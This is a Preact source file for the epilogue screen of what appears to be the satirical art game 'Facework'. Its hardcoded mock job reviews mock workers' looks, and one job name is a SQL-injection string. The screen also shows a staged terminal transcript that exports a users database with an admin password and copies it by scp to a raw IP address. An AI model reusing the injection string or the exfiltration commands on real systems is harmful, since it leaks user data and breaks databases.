import { FunctionalComponent, h } from "preact"
import { useTypedSelector } from "../../lib/store"
import { getStartingBalance, toDollars } from "../../lib/job"
import * as style from "./style.css"
import { uuid, addMessage } from "../../lib/logging"

const Epilogue: FunctionalComponent = () => {
  addMessage("epilogue", {})
  // const completedJobs = useTypedSelector(state => state.completedJobs)
  const completedJobs = [
    {
      name: "Food Delivery",
      trait: "Smiling",
      highScore: 0.30456263454849974,
      review:
        "What a disturbing experience! I couldn't tell if they were angry, confused, or just baring their teeth. But this delivery person almost ruined our meal",
      tip: 76,
      maxTip: 250
    },
    {
      name: "Tutor",
      trait: "Frowning",
      highScore: 0.7318345457315445,
      review:
        "Great strict tutor! Their intimidating frown kept my kids in line while studying.",
      tip: 365,
      maxTip: 500
    },
    {
      name: "Food Delivery",
      trait: "Fully Visible Forehead",
      highScore: 0.8667466435581446,
      review:
        "We just HATE getting our food delivered by sweaty creeps. It turns our stomachs. This Faceworker had a clean dry brow. The perfect appetizer for any meal.",
      tip: 866,
      maxTip: 1000
    },
    {
      name: "Food Delivery",
      trait: "Chubby",
      highScore: 0.6215188056230545,
      review:
        "Never trust a skinny chef they say! Well we feel the same about our delivery people! Nothing whets our appetites more for a meal than having it delivered by someone like this Facework who clearly enjoys food! Bon appetit!",
      tip: 1243,
      maxTip: 2000
    },
    {
      name: "Babysitter Study Aid",
      trait: "Child",
      highScore: 0.25028217433717326,
      review:
        "At Babysitting Academy we pride ourselves on giving our students real world babysitting training. But his Faceworker was far older than promised! They weren't fussy and they barely cried at bed time. A total waste of time.",
      tip: 1001,
      maxTip: 4000
    },
    {
      name: ".';DROP TABLE traits",
      trait: "CEO",
      highScore: 0.9999999992883996,
      review: "err -1 no error (no error): {{}} // todo: fix",
      tip: 999999999,
      maxTip: 1000000000
    }
  ]

  const grandTotal = getStartingBalance(completedJobs)

  const selected = completedJobs.map(job => {
    return {
      name: job.name,
      trait: job.trait,
      tip: job.tip
    }
  })

  return (
    <div className={`content ${style.appError}`}>
      <pre>
        {`   _                          
 _|_ _.  _  _        _  ._ |  
  | (_| (_ (/_ \\/\\/ (_) |  |< 

`}
        By <a href="https://twitter.com/kcimc">Kyle</a>, with{" "}
        <a href="https://gregborenstein.com/">Greg</a>,{" "}
        <a href="https://www.outofambit.com/">Evelyn</a>,{" "}
        <a href="http://trytobegood.com/">Fei</a> and{" "}
        <a href="https://github.com/seport">Sarah</a>. Supported by{" "}
        <a href="https://blog.mozilla.org/blog/2019/09/17/examining-ais-effect-on-media-and-truth/">
          Mozilla
        </a>
        .
        {`

root@facework$ status ${uuid}
Total: ${grandTotal}
Jobs: ${JSON.stringify(selected, null, 1)}
root@facework$ dbexport "users" -u admin -p deboulogne1862 > users.csv && zip users.zip users.csv && ls -lh users.zip
  adding: users.csv (deflated 63%)
-rw-r--r--@ 1 root  root   2.5G Nov 16  2020 users.zip
root@facework$ scp users.zip AfIaR0sl@45.55.87.240
users.zip       100%   2.5G   198.3MB/s   01:36
root@facework$ shutdown -h now
Connection closed by facework.app`}
      </pre>
      <video class={style.videoBackground} autoPlay muted playsInline loop>
        <source src="/assets/images/bg-15-15-gray-480p.mp4" type="video/mp4" />
      </video>
    </div>
  )
}

export default Epilogue
